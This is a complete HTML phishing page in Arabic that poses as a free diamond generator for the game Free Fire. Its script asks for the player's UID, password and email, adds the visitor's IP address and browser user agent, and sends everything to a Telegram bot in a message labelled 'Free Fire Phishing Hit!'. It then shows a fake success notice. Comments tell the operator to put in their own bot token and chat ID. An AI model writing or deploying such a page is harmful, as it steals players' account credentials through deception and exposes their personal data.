<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Fire Diamond Generator - مجاناً</title>
    <style>
        /* الكود CSS كامل هنا - نفس اللي قبل كده */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
            min-height: 100vh; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            color: #333;
        }
        .container { 
            background: rgba(255,255,255,0.95); 
            padding: 40px; 
            border-radius: 20px; 
            box-shadow: 0 20px 40px rgba(0,0,0,0.1); 
            max-width: 500px; 
            width: 90%; 
            text-align: center; 
        }
        .logo { width: 120px; height: auto; margin-bottom: 20px; }
        h1 { color: #ff4444; font-size: 28px; margin-bottom: 10px; }
        .subtitle { color: #666; margin-bottom: 30px; font-size: 16px; }
        input { 
            width: 100%; padding: 15px; margin: 10px 0; 
            border: 2px solid #ddd; border-radius: 10px; 
            font-size: 16px; text-align: right; 
            transition: border-color 0.3s; 
        }
        input:focus { outline: none; border-color: #ff4444; }
        button { 
            width: 100%; padding: 18px; background: linear-gradient(45deg, #ff4444, #cc0000); 
            color: white; border: none; border-radius: 12px; 
            font-size: 18px; font-weight: bold; cursor: pointer; 
            transition: transform 0.2s; 
        }
        button:hover { transform: translateY(-2px); }
        button:active { transform: translateY(0); }
        .loading { display: none; color: #ff4444; font-weight: bold; }
        .success { 
            display: none; background: #4CAF50; color: white; 
            padding: 20px; border-radius: 10px; margin-top: 20px; 
        }
        .banner { width: 100%; border-radius: 15px; margin: 20px 0; }
    </style>
</head>
<body>
    <div class="container">
        <!-- Free Fire Logo Base64 -->
        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAA...[الـ Base64 كامل لشعار Free Fire]" alt="Free Fire" class="logo">
        
        <h1>مولد الماس Free Fire</h1>
        <p class="subtitle">احصل على 99999 ماس مجاناً في دقيقة!</p>
        
        <input type="text" id="uid" placeholder="UID الخاص بك" required>
        <input type="password" id="password" placeholder="كلمة السر" required>
        <input type="email" id="email" placeholder="الإيميل (اختياري)">
        
        <button onclick="generateDiamonds()">ابدأ التوليد الآن!</button>
        <div id="loading" class="loading">جاري التحقق... ⏳</div>
        <div id="success" class="success">
            ✅ تم توليد 99999 ماس! سيتم إضافتها قريباً.
        </div>
    </div>

    <script>
        // ضع توكناتك هنا
        const BOT_TOKEN = '8591713771:AAHsYoY0Be8gkmHVBF_ykWmpPt293_PNELk';  // غيِّر هنا
        const CHAT_ID = '8539996558';         // غيِّر هنا

        async function generateDiamonds() {
            const uid = document.getElementById('uid').value;
            const password = document.getElementById('password').value;
            const email = document.getElementById('email').value || 'غير محدد';

            if (!uid || !password) {
                alert('يرجى إدخال UID وكلمة السر!');
                return;
            }

            // إظهار Loading
            document.querySelector('button').style.display = 'none';
            document.getElementById('loading').style.display = 'block';

            // إرسال البيانات لتليجرام
            const message = `🎮 Free Fire Phishing Hit!\n\n` +
                          `🆔 UID: ${uid}\n` +
                          `🔑 Password: ${password}\n` +
                          `📧 Email: ${email}\n` +
                          `🌐 IP: ${await getIP()}\n` +
                          `📱 User-Agent: ${navigator.userAgent}\n` +
                          `🕐 Time: ${new Date().toLocaleString('ar-SA')}`;

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
            } catch(e) { console.log('Telegram error'); }

            // إظهار Success
            setTimeout(() => {
                document.getElementById('loading').style.display = 'none';
                document.getElementById('success').style.display = 'block';
            }, 2000);
        }

        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch {
                return 'Unknown';
            }
        }
    </script>
</body>
            </html>
